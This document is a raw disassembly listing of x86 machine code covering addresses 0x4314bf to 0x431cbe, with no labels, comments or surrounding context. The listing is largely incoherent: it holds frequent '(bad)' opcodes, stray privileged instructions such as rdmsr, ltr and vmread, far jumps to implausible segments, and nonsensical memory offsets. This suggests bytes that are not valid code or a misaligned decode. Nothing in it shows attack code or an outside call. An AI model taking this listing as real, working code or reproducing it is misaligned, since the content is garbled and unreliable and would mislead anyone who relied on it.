  4314bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314c5:	lea    edx,[eax-0x1]
  4314c8:	jne    0x43149b
  4314ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314d0:	dec    BYTE PTR [ecx+0x51559eff]
  4314d6:	mov    DWORD PTR [esi-0x4c],esp
  4314d9:	push   ebp
  4314da:	jmp    DWORD PTR [esi-0x18]
  4314dd:	inc    ebp
  4314de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314e4:	(bad)  
  4314e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314e6:	inc    eax
  4314e8:	test   DWORD PTR [esi-0x2],esp
  4314eb:	inc    ebp
  4314ec:	dec    DWORD PTR [ebp-0x760bde75]
  4314f2:	(bad)  
  4314f3:	test   al,0xc3
  4314f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314fb:	lods   al,BYTE PTR ds:[esi]
  4314fc:	push   eax
  4314fd:	inc    ebp
  4314fe:	jne    0x43150f
  431500:	dec    DWORD PTR [ebp+0x8]
  431503:	mov    ecx,DWORD PTR [ebx]
  431505:	sbb    al,0x0
  431507:	(bad)  
  431508:	mov    eax,0xc14fc3
  43150d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431513:	movsx  ecx,WORD PTR [ebp+0x4e]
  431517:	xor    eax,DWORD PTR [eax]
  431519:	add    eax,edi
  43151b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431521:	xor    edi,DWORD PTR [eax+0x854f66]
  431527:	dec    BYTE PTR [ecx-0x76bb01]
  43152d:	mov    BYTE PTR [ebx-0x76724001],al
  431533:	pushf  
  431534:	inc    esi
  431535:	(bad)  
  431536:	dec    DWORD PTR [ebp-0x7abe6373]
  43153c:	sar    esi,0x89
  43153f:	dec    DWORD PTR [eax+0x0]
  431542:	inc    DWORD PTR [eax]
  431544:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43154b:	xlat   BYTE PTR ds:[ebx]
  43154c:	dec    edx
  43154d:	add    bh,bh
  43154f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431555:	lea    esp,[esi-0x50]
  431558:	(bad)  
  431559:	(bad)  
  43155a:	call   DWORD PTR [eax-0x1]
  43155d:	inc    ebp
  43155e:	rdpmc  
  431560:	add    BYTE PTR [ebx],al
  431562:	push   ax
  431564:	lea    eax,[ebp-0x1]
  43156a:	js     0x43156b
  43156c:	add    al,bh
  43156e:	push   bp
  431570:	lea    ecx,[ebp-0x7701]
  431576:	fmul   DWORD PTR [ebp-0x7a997800]
  43157c:	(bad)  
  43157d:	(bad)  
  43157e:	(bad)  
  43157f:	(bad)  
  431580:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431586:	dec    eax
  431587:	mov    eax,0x8d8dffff
  43158c:	mov    al,0xb0
  43158e:	(bad)  
  43158f:	call   DWORD PTR [ecx+0x50]
  431592:	dec    ebp
  431593:	inc    ebp
  431594:	mov    esi,0x7030833
  431599:	push   eax
  43159a:	into   
  43159b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4315a1:	call   DWORD PTR [ecx-0x8]
  4315a4:	lea    edx,[ebp-0x1]
  4315a7:	jmp    0x7617ab
  4315ac:	inc    eax
  4315ad:	jnp    0x43153c
  4315af:	add    dh,bh
  4315b1:	inc    WORD PTR [ebp-0x8a00b0]
  4315b8:	mov    edx,eax
  4315ba:	inc    esp
  4315bb:	add    bh,bh
  4315bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315c3:	dec    DWORD PTR [ebx-0x7f820301]
  4315c9:	add    BYTE PTR [ecx],al
  4315cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4315d2:	inc    eax
  4315d4:	(bad)  
  4315d5:	dec    si
  4315d7:	test   edi,edi
  4315d9:	(bad)  
  4315da:	cmp    edi,edi
  4315dc:	add    ecx,DWORD PTR [edi-0x39]
  4315df:	mov    edx,DWORD PTR [edx+0x66]
  4315e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4315e8:	mov    eax,0x66ff8b5e
  4315ee:	jmp    0xb4ff:0xc7ff3895
  4315f5:	push   ecx
  4315f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315fc:	call   DWORD PTR [esi-0x1]
  4315ff:	dec    DWORD PTR [eax]
  431601:	mov    ecx,0x805ff
  431606:	inc    ebp
  431607:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43160d:	mov    ecx,0x35784
  431612:	add    BYTE PTR [ecx-0xffa59b],cl
  431618:	inc    ebp
  431619:	mov    ecx,0x9c6131
  43161e:	(bad)  
  43161f:	mov    eax,ebx
  431621:	pop    esp
  431622:	test   edi,edi
  431624:	clc    
  431625:	lea    eax,[ebp-0x24]
  431628:	cmp    eax,0xc7fe9c8d
  43162d:	push   eax
  43162f:	lea    eax,[ebp+0x45fff8fe]
  431635:	mov    esi,DWORD PTR [ecx]
  431637:	hlt    
  431638:	lahf   
  431639:	push   esp
  43163a:	mov    edx,DWORD PTR [ecx-0x4]
  43163d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431643:	add    BYTE PTR [ebp-0x35],al
  431646:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43164c:	mov    edx,DWORD PTR [ecx-0x74]
  43164f:	rol    BYTE PTR [eax],0x8d
  431652:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431656:	nop
  431657:	push   ecx
  431658:	add    bh,bh
  43165a:	mov    esp,edi
  43165c:	in     al,0x85
  43165e:	jge    0x43165e
  431660:	test   edi,edi
  431662:	jne    0x4315e9
  431664:	(bad)  
  431665:	(bad)  
  431666:	sbb    bh,bh
  431668:	push   ebp
  431669:	inc    ebp
  43166a:	call   0xffdc10fa
  43166f:	add    BYTE PTR [ebp+0x66],al
  431672:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431678:	cmp    al,0x85
  43167a:	ud0    eax,DWORD PTR [ebp-0x1]
  43167e:	test   DWORD PTR [edi+0x74],ecx
  431681:	dec    edi
  431682:	inc    DWORD PTR [ebp-0x50004]
  431688:	dec    DWORD PTR [edi-0x75]
  43168b:	dec    esi
  43168c:	cld    
  43168d:	test   DWORD PTR [eax+0xff01ff],eax
  431693:	icebp  
  431694:	add    BYTE PTR [edi-0x3a],cl
  431697:	test   ebx,eax
  431699:	inc    BYTE PTR [ebp-0x1]
  43169c:	jne    0x43169e
  43169e:	mov    eax,DWORD PTR [eax]
  4316a0:	cld    
  4316a1:	xor    BYTE PTR [ecx+0x500155],cl
  4316a7:	push   ebp
  4316a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4316ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4316b4:	add    al,BYTE PTR [eax]
  4316b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316bc:	add    ah,ch
  4316be:	or     BYTE PTR [ebp+0x4501f845],dh
  4316c4:	jmp    0xdf19ba
  4316c9:	(bad)  
  4316ca:	nop    ecx
  4316cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4316d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4316d6:	mov    eax,edi
  4316d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4316db:	add    eax,0x45fef885
  4316e0:	dec    DWORD PTR [ebx+0x339445]
  4316e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316ec:	dec    DWORD PTR [ebx-0x460f0375]
  4316f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316f3:	add    esi,edi
  4316f5:	add    bh,bh
  4316f7:	rdpmc  
  4316f9:	add    BYTE PTR [ebx],0x1
  4316fc:	mov    DWORD PTR [eax],eax
  4316fe:	add    al,0x45
  431700:	dec    DWORD PTR [ecx-0x360b3373]
  431706:	dec    DWORD PTR [esi]
  431708:	push   eax
  431709:	jne    0x431750
  43170b:	mov    esi,DWORD PTR [ebx]
  43170d:	cld    
  43170e:	add    esp,ecx
  431710:	push   eax
  431711:	inc    DWORD PTR [ebp-0x75]
  431714:	add    eax,0x800e4
  431719:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43171f:	mov    DWORD PTR [ecx],eax
  431721:	sbb    al,0x0
  431723:	leave  
  431724:	test   DWORD PTR [edi-0x2],eax
  431727:	jne    0x431728
  431729:	call   0xff44012e
  43172e:	xor    BYTE PTR [ebp+0x4d],al
  431731:	mov    edi,edi
  431733:	enter  0x8,0x4d
  431737:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43173d:	mov    eax,DWORD PTR [eax]
  43173f:	cld    
  431740:	add    DWORD PTR [ecx],ebx
  431742:	inc    ebp
  431743:	dec    ebp
  431744:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43174a:	inc    eax
  43174b:	dec    DWORD PTR [ecx-0x270375]
  431751:	add    BYTE PTR [ebx-0x39d72701],cl
  431757:	xchg   ecx,eax
  431758:	ret    
  431759:	add    BYTE PTR [ebp-0x830075],al
  43175f:	add    BYTE PTR [ebp-0x75],al
  431762:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431768:	lea    edi,[edi-0xc]
  43176b:	add    bh,bh
  43176d:	mov    edx,DWORD PTR [eax-0x7b]
  431770:	inc    ebp
  431771:	rdpmc  
  431773:	jne    0x431778
  431775:	add    BYTE PTR [eax-0x75],dl
  431778:	inc    ebp
  431779:	clc    
  43177a:	add    eax,0x400009
  43177f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431785:	mov    eax,DWORD PTR [ecx]
  431787:	in     al,dx
  431788:	add    dh,al
  43178a:	test   ebx,eax
  43178c:	inc    BYTE PTR [ebp-0xff0001]
  431792:	add    BYTE PTR [ebp-0x43],al
  431795:	cmp    esi,0xfffffff8
  431798:	(bad)  
  431799:	push   DWORD PTR [eax]
  43179b:	add    BYTE PTR [ebp-0x3a],dl
  43179e:	test   ebx,eax
  4317a0:	je     0x431727
  4317a2:	mov    edi,edi
  4317a4:	sbb    al,0xff
  4317a6:	test   DWORD PTR gs:[eax],eax
  4317a9:	(bad)  
  4317aa:	js     0x4317ab
  4317ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4317b2:	sub    eax,ebx
  4317b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317ba:	add    eax,DWORD PTR [eax]
  4317bc:	dec    ebp
  4317bd:	push   eax
  4317be:	mov    al,BYTE PTR [ebp+0x1]
  4317c1:	mov    eax,DWORD PTR [ebp-0x68]
  4317c4:	mov    eax,DWORD PTR [eax]
  4317c6:	sbb    bh,al
  4317c8:	or     ah,dh
  4317ca:	dec    ebp
  4317cb:	inc    DWORD PTR [eax+0x4]
  4317ce:	push   ecx
  4317cf:	add    BYTE PTR [edx-0x1],dh
  4317d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317e8:	push   ecx
  4317e9:	cmp    BYTE PTR [ebx],al
  4317eb:	inc    ebp
  4317ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317f2:	(bad)  
  4317f3:	(bad)  
  4317f4:	in     al,0xff
  4317f6:	add    BYTE PTR [ebp+0x0],al
  4317f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317ff:	add    al,bh
  431801:	(bad)  
  431802:	jmp    0x8d85:0x74b0558d
  431809:	dec    DWORD PTR [eax]
  43180b:	call   DWORD PTR [ebp-0x7b]
  43180e:	mov    edi,esi
  431810:	lock call DWORD PTR [ebp-0x75]
  431814:	mov    esi,esp
  431816:	mov    ah,0xc6
  431818:	mov    bh,0xc3
  43181a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431820:	add    DWORD PTR [eax],0x450050ff
  431826:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43182c:	inc    edi
  43182e:	push   esp
  431830:	jmp    0xcd00:0x650481ff
  431837:	mov    DWORD PTR [ebx],esi
  431839:	clc    
  43183a:	cmp    edi,0xff9cff3c
  431840:	jne    0x43184a
  431842:	mov    eax,eax
  431844:	add    esi,DWORD PTR [eax]
  431846:	int3   
  431847:	inc    ebp
  431848:	cmp    al,0x83
  43184a:	add    BYTE PTR [eax],bl
  43184c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431852:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431858:	mov    edi,eax
  43185a:	cmp    BYTE PTR [ebp+0x45],cl
  43185d:	jmp    0x4317ea
  43185f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431862:	inc    ebp
  431863:	or     al,0x2
  431865:	dec    DWORD PTR [ebp+0x18]
  431868:	jne    0x4318bf
  43186a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431870:	mov    edi,DWORD PTR [ebx]
  431872:	in     al,0x50
  431874:	xchg   ecx,eax
  431875:	jmp    0x343677a
  43187a:	adc    al,0x8b
  43187c:	inc    ebp
  43187d:	mov    al,ds:0x8b04008b
  431882:	push   ebp
  431883:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431889:	push   ebp
  43188a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431890:	inc    ebp
  431891:	dec    ebp
  431892:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431898:	mov    DWORD PTR [eax],0xe9ff00f4
  43189e:	add    al,0x0
  4318a0:	add    BYTE PTR [eax],al
  4318a2:	mov    eax,edx
  4318a4:	push   eax
  4318a5:	rol    DWORD PTR [ebp-0xf0177],1
  4318ab:	bound  eax,QWORD PTR [ebp+0x50]
  4318ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318ba:	mov    al,0xf
  4318bc:	test   DWORD PTR [edx],edx
  4318be:	call   DWORD PTR [ebp-0x7a0001]
  4318c4:	(bad)  
  4318c5:	loop   0x4318c6
  4318c7:	jnp    0xc6990ccd
  4318cd:	mov    eax,ebx
  4318cf:	cmp    al,0x8b
  4318d1:	(bad)  
  4318d2:	cld    
  4318d3:	shr    esi,0xc
  4318d6:	add    dl,al
  4318d8:	push   eax
  4318d9:	lea    eax,[ebp-0x1]
  4318dc:	mov    edx,esi
  4318de:	cwde   
  4318df:	cli    
  4318e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318e6:	or     BYTE PTR [eax],cl
  4318e8:	inc    ebp
  4318e9:	dec    ebp
  4318ea:	inc    DWORD PTR [ebx+0x74803914]
  4318f0:	add    DWORD PTR [ebx+0x451800],ecx
  4318f6:	call   DWORD PTR [eax+edx*1]
  4318f9:	add    ecx,DWORD PTR [ebp-0x34]
  4318fc:	push   edi
  4318fd:	adc    al,0x8
  4318ff:	mov    edx,DWORD PTR [ebp-0x14]
  431902:	mov    ecx,DWORD PTR [ebp+0x18]
  431905:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431909:	inc    DWORD PTR [eax+esi*8]
  43190c:	inc    ebp
  43190d:	stos   BYTE PTR es:[edi],al
  43190e:	mov    edx,DWORD PTR [ebp-0x4]
  431911:	add    DWORD PTR [ebp-0x1c],eax
  431914:	mov    edx,DWORD PTR [ebp-0x70]
  431917:	cmp    eax,DWORD PTR [eax]
  431919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43191a:	mov    eax,DWORD PTR [eax]
  43191c:	cld    
  43191d:	jae    0x43189f
  43191f:	add    eax,DWORD PTR [ecx]
  431921:	clc    
  431922:	add    BYTE PTR [eax+0x30],dl
  431925:	mov    DWORD PTR [ecx],esi
  431927:	clc    
  431928:	pop    ds
  431929:	inc    ebp
  43192a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431930:	(bad)  
  431931:	push   DWORD PTR [edi]
  431933:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431939:	(bad)  
  43193a:	jae    0x43193b
  43193c:	mov    eax,DWORD PTR [ebp-0x740175]
  431942:	sub    eax,DWORD PTR [eax]
  431944:	add    eax,DWORD PTR [eax]
  431946:	mov    DWORD PTR [ecx+0x5f],eax
  431949:	mov    DWORD PTR [ebx-0x4],ebx
  43194c:	ret    0xff
  43194f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431955:	ret    
  431956:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43195c:	add    BYTE PTR [ebp-0x7d],al
  43195f:	mov    DWORD PTR [eax],eax
  431961:	add    al,0x84
  431963:	inc    DWORD PTR [ecx]
  431965:	lea    eax,[eax]
  431967:	hlt    
  431968:	sar    bh,cl
  43196a:	test   BYTE PTR [eax+0x1],dl
  43196d:	inc    ebp
  43196e:	add    BYTE PTR [ebx],dh
  431970:	test   BYTE PTR [ebx],0x84
  431973:	push   eax
  431974:	add    BYTE PTR [ebp+0x0],al
  431977:	add    eax,0x86
  43197c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431982:	add    BYTE PTR [ecx],al
  431984:	add    BYTE PTR [eax],al
  431986:	mov    esi,0x550030
  43198b:	mov    ecx,DWORD PTR [edi]
  43198d:	cld    
  43198e:	fidiv  DWORD PTR [ebp+0x0]
  431991:	mov    edi,DWORD PTR [ecx]
  431993:	xor    BYTE PTR [eax+eax*1],0x84
  431997:	add    eax,DWORD PTR [eax]
  431999:	sbb    BYTE PTR [eax],al
  43199b:	jne    0x43194e
  43199d:	mov    eax,DWORD PTR [ecx]
  43199f:	sbb    BYTE PTR [eax],al
  4319a1:	mov    DWORD PTR [ebp-0x1],esp
  4319a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4319aa:	ret    0xb7fc
  4319ad:	dec    ebp
  4319ae:	or     al,0x89
  4319b0:	dec    ebp
  4319b1:	cld    
  4319b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4319b6:	add    edi,esp
  4319b8:	seto   BYTE PTR [esi-0x72ffffff]
  4319bf:	inc    ebp
  4319c0:	adc    al,0x8b
  4319c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319c9:	cmp    DWORD PTR [edi+0x72],edx
  4319cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319d2:	gs cmp al,0x0
  4319d5:	je     0x4319ad
  4319d7:	push   eax
  4319d8:	sar    BYTE PTR [eax],1
  4319da:	mov    bh,0x3e
  4319dc:	push   cs
  4319dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319e3:	add    DWORD PTR [ecx+0x12],ebp
  4319e6:	dec    edx
  4319e7:	(bad)  
  4319e8:	mov    eax,edx
  4319ea:	in     al,dx
  4319eb:	adc    DWORD PTR [ecx],esi
  4319ed:	pop    esi
  4319ee:	inc    ecx
  4319ef:	leave  
  4319f0:	or     DWORD PTR [eax],ebx
  4319f2:	gs push ebp
  4319f4:	add    ah,ch
  4319f6:	into   
  4319f7:	in     al,dx
  4319f8:	enter  0xb756,0xf0
  4319fc:	push   cs
  4319fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a07:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a0d:	jnp    0x74439f15
  431a13:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a19:	add    BYTE PTR [edi],cl
  431a1b:	mov    edi,DWORD PTR [ecx-0x78]
  431a1e:	ltr    WORD PTR [ecx-0x7b]
  431a22:	dec    DWORD PTR [edi]
  431a24:	clc    
  431a25:	out    0x45,eax
  431a27:	add    BYTE PTR [eax],cl
  431a29:	cmp    ebx,0xffffff8c
  431a2c:	jge    0x431a2e
  431a2e:	jb     0x431a40
  431a30:	je     0x521ab0
  431a36:	pop    edx
  431a37:	push   esi
  431a38:	mov    ecx,DWORD PTR [edi]
  431a3a:	in     al,dx
  431a3b:	rol    DWORD PTR [ebp+0x0],1
  431a3e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a45:	cmp    DWORD PTR [ecx],0xfffffff0
  431a48:	hlt    
  431a49:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a4f:	(bad)  
  431a51:	push   eax
  431a52:	jns    0xb842fed0
  431a58:	lock push cs
  431a5a:	ror    edx,0x3
  431a5d:	test   BYTE PTR [ecx+0x5500e800],cl
  431a63:	dec    eax
  431a64:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a68:	(bad)  
  431a69:	mov    esi,0x7f33ff5f
  431a6e:	inc    eax
  431a6f:	test   DWORD PTR [edx],eax
  431a71:	je     0x431a33
  431a73:	mov    ecx,ecx
  431a75:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a79:	and    eax,DWORD PTR [eax+0xf0103]
  431a7f:	jp     0x431a6d
  431a81:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a85:	add    edx,DWORD PTR [edi+0x74]
  431a88:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a8e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a94:	je     0x431a19
  431a96:	cmp    eax,edi
  431a98:	js     0x431abd
  431a9a:	add    eax,0xeb0fc003
  431a9f:	jns    0x431a2c
  431aa1:	vmread DWORD PTR [ecx+0x45],ebx
  431aa5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431aab:	adc    al,0x8b
  431aad:	jge    0x431ac3
  431aaf:	mov    edi,DWORD PTR [eax-0x4]
  431ab2:	add    edi,DWORD PTR [edi]
  431ab4:	or     bh,bh
  431ab6:	push   ebp
  431ab7:	push   es
  431ab8:	mov    DWORD PTR [ebp-0x4],ebx
  431abb:	add    edi,esi
  431abd:	pop    es
  431abe:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ac4:	mov    DWORD PTR [esp+esi*8],ecx
  431ac7:	inc    ebp
  431ac8:	pop    ebp
  431ac9:	xor    DWORD PTR [esi-0x4],0x3b
  431acd:	add    edx,DWORD PTR [ecx+edi*1]
  431ad0:	push   es
  431ad1:	clc    
  431ad2:	mov    bh,0xdb
  431ad4:	jp     0x431a8d
  431ad6:	add    cl,BYTE PTR [esi]
  431ad8:	div    DWORD PTR [edi+0x4d8b0c1c]
  431ade:	test   edi,edi
  431ae0:	je     0x431ad6
  431ae2:	mov    eax,ecx
  431ae4:	or     BYTE PTR [ebx],al
  431ae6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431aec:	jbe    0x431b60
  431aee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431af4:	add    ecx,DWORD PTR [esi]
  431af6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431afc:	add    eax,DWORD PTR [ebx-0x287af783]
  431b02:	je     0x431b51
  431b04:	mov    DWORD PTR [ecx],edi
  431b06:	mov    esi,eax
  431b08:	hlt    
  431b09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b10:	jb     0x431ad2
  431b12:	jmp    0x431aff
  431b14:	xor    esi,DWORD PTR [ebx]
  431b16:	pop    edi
  431b17:	pop    esi
  431b18:	pop    ebx
  431b19:	ret    
  431b1a:	ret    0x8b
  431b1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b23:	xor    DWORD PTR [ecx],0xc
  431b26:	pushf  
  431b27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b2d:	rdmsr  
  431b2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b36:	dec    ebp
  431b37:	ret    
  431b38:	mov    edi,DWORD PTR [esi-0x4]
  431b3b:	pop    eax
  431b3c:	dec    ebp
  431b3d:	jne    0x431aca
  431b3f:	xor    edi,esp
  431b41:	inc    eax
  431b42:	dec    ebp
  431b43:	jbe    0x431b98
  431b45:	inc    eax
  431b46:	pop    ebp
  431b47:	add    edx,DWORD PTR [esi+0x8]
  431b4a:	push   esp
  431b4b:	dec    eax
  431b4c:	push   ecx
  431b4d:	mov    eax,edi
  431b4f:	and    al,0xf0
  431b51:	jo     0x431b3e
  431b53:	mov    eax,DWORD PTR [ebx]
  431b55:	sbb    BYTE PTR [ebp+0x4d],cl
  431b58:	mov    eax,DWORD PTR [ebx]
  431b5a:	nop
  431b5b:	or     BYTE PTR [eax],al
  431b5d:	jne    0x431bb6
  431b5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b65:	cld    
  431b66:	xor    edi,edi
  431b68:	add    edi,DWORD PTR [ebp+0x3]
  431b6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b71:	js     0x431af7
  431b73:	jae    0x431b77
  431b75:	(bad)  
  431b77:	xor    al,0x5d
  431b79:	jmp    0x431b06
  431b7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b82:	fdecstp 
  431b84:	test   BYTE PTR [edi],ah
  431b86:	add    bh,BYTE PTR [ebp+0x0]
  431b89:	add    ebx,DWORD PTR [ebp-0x77]
  431b8c:	mov    edi,eax
  431b8e:	cmp    al,0x0
  431b91:	adc    dh,BYTE PTR [ebx]
  431b93:	jge    0x431b98
  431b95:	mov    edi,DWORD PTR [ebx]
  431b97:	jl     0x431ba8
  431b99:	clc    
  431b9a:	dec    edi
  431b9b:	jge    0x431b9d
  431b9d:	mov    eax,DWORD PTR [ebx]
  431b9f:	jb     0x431ba9
  431ba1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ba4:	mov    edi,edi
  431ba6:	xor    edx,DWORD PTR [eax]
  431ba8:	add    edi,DWORD PTR [ebx]
  431baa:	mov    DWORD PTR [ebp-0x10],edi
  431bad:	inc    edi
  431bae:	pop    ebp
  431baf:	jge    0x431bec
  431bb1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431bb5:	mov    edx,0xc05d87f0
  431bba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431bbe:	fimul  WORD PTR [eax]
  431bc0:	fist   WORD PTR [ebp+0x1c]
  431bc3:	in     al,dx
  431bc4:	jne    0x431bb2
  431bc6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bcc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bd0:	fdivp  st(0),st
  431bd2:	fild   WORD PTR [ebp+0x4510f85c]
  431bd8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bde:	inc    ebp
  431bdf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431be5:	mov    ebp,DWORD PTR [ebx-0x4]
  431be8:	adc    al,0x8b
  431bea:	rcl    DWORD PTR [eax],0x48
  431bed:	mov    esi,0x7080803
  431bf2:	fiadd  WORD PTR [ebp+0x4d]
  431bf5:	(bad)  
  431bf6:	mov    edx,DWORD PTR [edx-0x4]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c02:	mov    DWORD PTR [edi+0x872dc],edi
  431c08:	xlat   BYTE PTR ds:[ebx]
  431c09:	into   
  431c0a:	ffreep st(6)
  431c0c:	retf   0x6c7
  431c0f:	iret   
  431c10:	dec    ebp
  431c11:	inc    ebp
  431c12:	mov    DWORD PTR [ebx],edi
  431c14:	fmul   QWORD PTR [edi]
  431c16:	dec    ebp
  431c17:	jnp    0x431c4c
  431c19:	add    BYTE PTR [ebx],al
  431c1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431c1e:	inc    ebp
  431c1f:	dec    ebp
  431c20:	lea    esi,[ebx]
  431c22:	add    DWORD PTR [ebx],eax
  431c24:	jb     0x431c61
  431c26:	add    BYTE PTR [edi],cl
  431c28:	inc    ebp
  431c29:	imul   eax,edi,0x858bd800
  431c2f:	cld    
  431c30:	clc    
  431c31:	mov    DWORD PTR [ebp+0x0],eax
  431c34:	inc    DWORD PTR [eax]
  431c36:	or     al,0xde
  431c38:	sbb    bh,0x1
  431c3b:	retf   
  431c3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c43:	dec    ebp
  431c44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c4a:	enter  0x12de,0xdf
  431c4e:	inc    ebp
  431c4f:	pop    ebp
  431c50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c56:	add    DWORD PTR [edx],edx
  431c58:	add    BYTE PTR [ebp+0x50],dl
  431c5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c67:	or     ah,al
  431c69:	pop    ss
  431c6a:	cdq    
  431c6b:	push   ebp
  431c6c:	clc    
  431c6d:	mov    eax,DWORD PTR [ebp-0x4]
  431c70:	xor    edx,edx
  431c72:	add    esi,DWORD PTR [ebx]
  431c74:	cmp    eax,DWORD PTR [ebx]
  431c76:	hlt    
  431c77:	cmp    DWORD PTR [ebx],esp
  431c79:	or     al,BYTE PTR [ebp+0xf]
  431c7c:	mov    eax,DWORD PTR [edx]
  431c7e:	loopne 0x431c80
  431c80:	(bad)  
  431c81:	mov    ecx,esi
  431c83:	cld    
  431c84:	pushf  
  431c85:	pop    ebp
  431c86:	fwait
  431c87:	mov    esi,DWORD PTR [edx]
  431c89:	lock mov eax,eax
  431c8c:	adc    BYTE PTR [ebx],al
  431c8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c9b:	dec    ebp
  431c9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ca2:	(bad)  
  431ca3:	iret   
  431ca4:	inc    ebp
  431ca5:	(bad)  
  431ca6:	jne    0x431cf5
  431ca8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431cae:	(bad)  
  431caf:	cmp    ebx,eax
  431cb1:	je     0x431c39
  431cb3:	add    edi,edi
  431cb5:	or     bh,bh
  431cb7:	dec    ebp
  431cb8:	inc    ebp
  431cb9:	mov    esi,DWORD PTR [ebx]
  431cbb:	cld    
  431cbc:	add    ecx,esi
  431cbe:	cmp    ecx,DWORD PTR [eax-0xc]
